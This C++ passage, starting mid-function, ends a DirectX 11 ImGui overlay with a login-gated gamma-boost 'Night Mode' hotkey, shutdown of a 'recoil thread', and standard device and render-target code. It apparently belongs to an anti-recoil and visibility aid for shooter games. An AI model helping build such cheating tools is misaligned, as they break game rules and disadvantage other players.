                if (g_isLoggedIn.load(std::memory_order_relaxed) && nightModeKeyCurrentlyPressed && !g_nightModeKeyPressedLastFrame) {
                    if (!g_isGammaInitialized) {
                        InitializeGammaControls(); // Attempt to initialize if not already
                    }

                    if (g_isGammaInitialized) { // Proceed only if initialization was successful
                        g_isGammaBoosted = !g_isGammaBoosted;
                        ApplyCurrentGammaRamp();
                        // Log messages inside ApplyCurrentGammaRamp will indicate success/failure and new state
                    } else {
                        printf("Gamma controls are not initialized. Cannot toggle Night Mode.\n");
                    }
                }
            }
            g_nightModeKeyPressedLastFrame = nightModeKeyCurrentlyPressed;

            ImGui::Render();
            // Use the same dark grey color for clearing the background
            const float clear_color_with_alpha[4] = { clear_color.x * clear_color.w, clear_color.y * clear_color.w, clear_color.z * clear_color.w, clear_color.w };
            g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, NULL);
            // Only clear if the window is visible, otherwise we might clear the game screen
            g_pd3dDeviceContext->ClearRenderTargetView(g_mainRenderTargetView, clear_color_with_alpha);

            ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());

            HRESULT hr = g_pSwapChain->Present(1, 0); // Present with vsync
            if (hr == DXGI_ERROR_DEVICE_REMOVED || hr == DXGI_ERROR_DEVICE_RESET) {
                output_log_message("Error: DirectX device lost/reset. Exiting.\n");
                done = true; // Exit the application
            }
        } else {
            // When hidden, we don't render anything related to the UI.
            // The main loop continues processing messages via WaitMessage.
        }
    } // End main loop

    // 9. Cleanup
    // Ensure the recoil thread is cleanly stopped and joined at program exit
    if (recoil_thread_obj.joinable()) {
        g_recoil_thread_should_run.store(false, std::memory_order_relaxed);
        recoil_thread_obj.join();
    }

    // Call the dedicated cleanup function before the application exits
    cleanup_and_exit();

    return 0;
}

// --- Win32 Message Procedure ---
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    // Pass messages to ImGui first *only if the window is visible*
    // This prevents ImGui from capturing input when the UI is hidden.
    // We need to read the atomic state here.
    bool is_window_visible = show_config_window_atomic.load(std::memory_order_relaxed);
    if (is_window_visible && ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true; // ImGui handled the message

    switch (msg) {
    case WM_SIZE:
        if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED) {
            CleanupRenderTarget();
            g_pSwapChain->ResizeBuffers(0, (UINT)LOWORD(lParam), (UINT)HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0);
            CreateRenderTarget();
        }
        return 0;
    case WM_SYSCOMMAND:
        // Prevent activation of system menu, screen saver, monitor power save
        if ((wParam & 0xfff0) == SC_KEYMENU || wParam == SC_SCREENSAVE || wParam == SC_MONITORPOWER)
             return 0;
        break; // Important: Use break here, not return 0, for default processing of other syscommands
    case WM_DESTROY:
        // WM_DESTROY is received when the window is being destroyed.
        // We post WM_QUIT here to signal the main message loop to exit.
        // The actual cleanup (including playing the exit sound) is now handled
        // by the cleanup_and_exit function called after the main loop finishes.
        ::PostQuitMessage(0);
        return 0;
    }
    return ::DefWindowProc(hWnd, msg, wParam, lParam); // Default handling for other messages
}

// --- DirectX 11 Setup/Cleanup Implementations ---
bool CreateDeviceD3D(HWND hWnd) {
    DXGI_SWAP_CHAIN_DESC sd;
    ZeroMemory(&sd, sizeof(sd));
    sd.BufferCount = 2; sd.BufferDesc.Width = 0; sd.BufferDesc.Height = 0;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60; sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT; sd.OutputWindow = hWnd;
    sd.SampleDesc.Count = 1; sd.SampleDesc.Quality = 0; sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

    UINT createDeviceFlags = 0;
    //createDeviceFlags |= D3D11_CREATE_DEVICE_DEBUG; // Uncomment for debug layer
    D3D_FEATURE_LEVEL featureLevel;
    const D3D_FEATURE_LEVEL featureLevelArray[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, };

    output_log_message("Calling D3D11CreateDeviceAndSwapChain (Hardware)...\n");
    HRESULT res = D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_HARDWARE, NULL, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
    if (res != S_OK) {
        output_log_message("Error: Hardware device creation failed. Trying WARP...\n");
        res = D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_WARP, NULL, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
        if (res != S_OK) {
             output_log_message("Error: WARP device creation failed too.\n");
             return false;
        }
        output_log_message("WARP device created successfully.\n");
    } else {
        output_log_message("Hardware device created successfully.\n");
    }

    output_log_message("Attempting to create render target...\n");
    CreateRenderTarget();
    output_log_message("Render target creation finished.\n");

    return true;
}

void CleanupDeviceD3D() {
    output_log_message("Cleaning up Direct3D resources...\n");
    CleanupRenderTarget();
    if (g_pSwapChain) { g_pSwapChain->Release(); g_pSwapChain = NULL; output_log_message("SwapChain released.\n"); }
    if (g_pd3dDeviceContext) { g_pd3dDeviceContext->Release(); g_pd3dDeviceContext = NULL; output_log_message("DeviceContext released.\n"); }
    if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = NULL; output_log_message("Device released.\n"); }
    output_log_message("Direct3D cleanup finished.\n");
}

void CreateRenderTarget() {
    ID3D11Texture2D* pBackBuffer = NULL;
    output_log_message("Attempting to get SwapChain buffer...\n");
    HRESULT hr = g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));
     if (FAILED(hr)) { output_log_message("Error getting back buffer.\n"); return; }
     output_log_message("SwapChain buffer obtained.\n");

    if (pBackBuffer) {
        output_log_message("Attempting to create RenderTargetView...\n");
        hr = g_pd3dDevice->CreateRenderTargetView(pBackBuffer, NULL, &g_mainRenderTargetView);
        pBackBuffer->Release(); // Release the back buffer interface as we no longer need it
        if (FAILED(hr)) { output_log_message("Error creating render target view.\n"); }
        else { output_log_message("RenderTargetView created.\n"); }
    } else {
        output_log_message("Error: Back buffer is NULL.\n");
    }
}
void CleanupRenderTarget() {    
    output_log_message("Cleaning up RenderTargetView...\n");
    if (g_mainRenderTargetView) { g_mainRenderTargetView->Release(); g_mainRenderTargetView = NULL; output_log_message("RenderTargetView released.\n"); }
    output_log_message("RenderTargetView cleanup finished.\n");
}
